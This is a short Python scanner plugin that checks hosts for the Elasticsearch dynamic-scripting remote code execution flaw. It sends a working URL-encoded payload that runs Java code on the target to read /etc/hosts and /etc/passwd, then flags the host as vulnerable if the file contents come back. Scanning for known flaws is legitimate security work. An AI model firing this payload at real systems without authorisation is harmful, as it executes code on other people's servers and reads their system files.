__author__ = '10192989'
# coding: utf-8

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if Elasticsearch vul')
    try:
        domain = 'http://'+'%s'% ip +':'+'%s'% port +'/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674'
        rqu = requests.get(domain, verify=False, timeout=3)
        if rqu.status_code==200 and '/etc/passwd' in rqu.text:
            msg = 'There is a Elasticsearch remote code exec vul on %s' %url
            print(msg)
            number = 'v20'
            return True,url,number,msg
        else:
            msg = 'There is no  Elasticsearch remote code exec vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        #print(msg)
        number = 'v0'
        return False,url,number,msg

